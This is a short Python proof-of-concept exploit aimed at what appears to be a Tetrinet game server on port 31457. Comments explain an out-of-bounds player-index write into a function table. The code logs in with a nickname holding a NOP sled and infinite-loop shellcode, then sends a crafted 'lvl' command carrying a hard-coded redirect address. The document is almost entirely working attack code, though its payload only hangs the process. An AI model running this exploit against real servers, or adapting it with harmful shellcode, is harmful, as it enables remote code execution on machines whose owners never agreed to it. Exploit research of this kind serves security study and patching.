# Exploit summary:
# "Player number" ends up in EAX, or "offset in player array"
# "player level" ends up in EBX
# pass WAY too big a value for player#, write an address into a function table
# overwrite the stub to another commonly called function

import socket, sys
import pytrinet._utils.utils as pyt

N = 1024*4
s = socket.socket()         # Create a socket object
port = 31457                # Reserve a port for your service.
ip = sys.argv[1]
s.connect((ip, port))        # Bind to the port

# we could probably find our way back here to the shellcode if
# absolutely necessary
shellcode = "\x90"*100 + "\xeb\xfe"

nick = shellcode
version = "1.13"

serverip = [ int(i) for i in sys.argv[1].split('.') ]

print(nick, version, serverip)
print("logging in...")
out = pyt.encode(nick, version, serverip)+"\xFF"
s.send(out)

print("sending exploit...")
ebfe_addr = 0x0044baff
s.send("lvl %d %d\xff" % (0xec, ebfe_addr))
print( s.recv(N) )
print( s.recv(N) )